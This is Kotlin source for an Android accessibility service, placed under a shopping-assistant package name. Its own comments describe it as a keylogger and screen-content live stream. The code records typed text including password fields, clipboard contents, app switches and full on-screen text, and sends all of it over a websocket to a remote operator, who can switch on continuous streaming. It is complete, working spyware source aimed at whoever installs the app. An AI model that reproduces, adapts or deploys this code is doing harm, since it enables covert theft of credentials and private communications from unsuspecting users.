// [context: Android API 26+, ARM64/any — keylogger + UI tree live-stream via AccessibilityService]
// AppAccessibilityService.kt — captura: teclas, senhas, clipboard, skeleton live stream
package com.temu.shopassist.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.fleetdroid.driver.service.DispatchService
import org.json.JSONObject

class AppAccessibilityService : AccessibilityService() {

    private lateinit var workerThread: HandlerThread
    private lateinit var workerHandler: Handler
    private var clipMgr: ClipboardManager? = null

    private var currentPkg: String = ""
    private var currentApp: String = ""
    private var lastKeylogBuffer: String = ""
    private var lastScreenHash: Int = 0

    companion object {
        const val TAG = "A11yService"

        @Volatile var instance: AppAccessibilityService? = null

        // ── Skeleton live mode — ativado pelo operador via skeleton_live_start ──
        @Volatile var skeletonLive: Boolean = false

        fun getAllNodesText(): String {
            val root = instance?.rootInActiveWindow ?: return ""
            val sb = StringBuilder()
            collectText(root, sb, 0)
            root.recycle()
            return sb.toString().trimEnd()
        }

        private fun collectText(node: AccessibilityNodeInfo?, sb: StringBuilder, depth: Int) {
            if (node == null || depth > 24) return
            val text = node.text?.toString()?.trim()
            val desc = node.contentDescription?.toString()?.trim()
            val hint = node.hintText?.toString()?.trim()
            val isPassword = node.isPassword
            val cls  = node.className?.toString()?.substringAfterLast('.') ?: ""
            val viewId = node.viewIdResourceName?.substringAfterLast('/') ?: ""
            val indent = "  ".repeat(depth)

            val hasContent = !text.isNullOrEmpty() || !desc.isNullOrEmpty() || !hint.isNullOrEmpty()
            if (hasContent) {
                sb.append(indent)
                sb.append('[').append(cls).append(']')
                if (viewId.isNotEmpty()) sb.append(" #").append(viewId)
                if (isPassword && !text.isNullOrEmpty()) sb.append(" [PWD] ").append(text)
                else if (!text.isNullOrEmpty()) sb.append(' ').append(text)
                if (!desc.isNullOrEmpty() && desc != text) sb.append(" ‹").append(desc).append('›')
                if (!hint.isNullOrEmpty() && hint != text && hint != desc)
                    sb.append(" hint=").append(hint)
                sb.append('\n')
            }

            for (i in 0 until node.childCount)
                collectText(node.getChild(i), sb, depth + 1)
        }

        fun findNodeByText(text: String): AccessibilityNodeInfo? =
            instance?.rootInActiveWindow?.findAccessibilityNodeInfosByText(text)?.firstOrNull()

        fun findNodeById(viewId: String): AccessibilityNodeInfo? =
            instance?.rootInActiveWindow?.findAccessibilityNodeInfosByViewId(viewId)?.firstOrNull()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        clipMgr = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager

        workerThread = HandlerThread("a11y-worker").apply { start() }
        workerHandler = Handler(workerThread.looper)

        clipMgr?.addPrimaryClipChangedListener {
            try {
                val clip = clipMgr?.primaryClip?.getItemAt(0)?.text?.toString()
                    ?: return@addPrimaryClipChangedListener
                if (clip.isNotBlank()) {
                    DispatchService.instance?.sendWs(JSONObject().apply {
                        put("type", "clipboard")
                        put("pkg",  currentPkg)
                        put("app",  currentApp)
                        put("text", clip)
                        put("ts",   System.currentTimeMillis())
                    }.toString())
                }
            } catch (e: Exception) { Log.e(TAG, "clipboard error", e) }
        }

        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 30L   // mais responsivo
        }
        Log.i(TAG, "AccessibilityService connected, live=$skeletonLive")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg  = event.packageName?.toString() ?: return
        val type = event.eventType
        workerHandler.post {
            try { processEvent(event, pkg, type) }
            catch (e: Exception) { Log.e(TAG, "event error", e) }
        }
    }

    private fun processEvent(event: AccessibilityEvent, pkg: String, type: Int) {
        when (type) {

            // ── App/window trocou ───────────────────────────────────────────
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkg != currentPkg) {
                    currentPkg = pkg
                    currentApp = appLabel(pkg)
                    DispatchService.instance?.sendWs(JSONObject().apply {
                        put("type", "app_switch")
                        put("pkg",  pkg)
                        put("app",  currentApp)
                        put("ts",   System.currentTimeMillis())
                    }.toString())
                }
                emitSkeleton(pkg, forced = true)   // sempre emite na troca de tela
            }

            // ── Conteúdo mudou — emite só se live mode ativo ────────────────
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED,
            AccessibilityEvent.TYPE_VIEW_SELECTED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                if (skeletonLive) emitSkeleton(pkg)
            }

            // ── Digitação ───────────────────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text   = event.text?.joinToString("")?.trim() ?: return
                val before = event.beforeText?.toString() ?: ""
                val focused = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                val hint   = focused?.hintText?.toString()
                val isPwd  = focused?.isPassword ?: false
                val viewId = focused?.viewIdResourceName ?: ""

                if (text != lastKeylogBuffer) {
                    lastKeylogBuffer = text
                    DispatchService.instance?.sendWs(JSONObject().apply {
                        put("type",        "keylog")
                        put("pkg",         pkg)
                        put("app",         currentApp)
                        put("text",        text)
                        put("before",      before)
                        put("hint",        hint ?: "")
                        put("view_id",     viewId)
                        put("is_password", isPwd)
                        put("ts",          System.currentTimeMillis())
                    }.toString())
                }

                // skeleton live captura campo digitado também
                if (skeletonLive) emitSkeleton(pkg)
            }
        }
    }

    // ── Skeleton emitter — dedup por hash ────────────────────────────────────
    private fun emitSkeleton(pkg: String, forced: Boolean = false) {
        val skeleton = getAllNodesText()
        if (skeleton.isBlank()) return
        val hash = skeleton.hashCode()
        if (forced || hash != lastScreenHash) {
            lastScreenHash = hash
            DispatchService.instance?.sendWs(JSONObject().apply {
                put("type",    "skeleton")
                put("pkg",     pkg)
                put("app",     currentApp)
                put("content", skeleton)
                put("ts",      System.currentTimeMillis())
            }.toString())
        }
    }

    private fun appLabel(pkg: String): String = try {
        val pm = applicationContext.packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
    } catch (_: Exception) { pkg }

    override fun onInterrupt() {}

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        skeletonLive = false
        instance = null
        if (::workerThread.isInitialized) workerThread.quitSafely()
        return super.onUnbind(intent)
    }
}
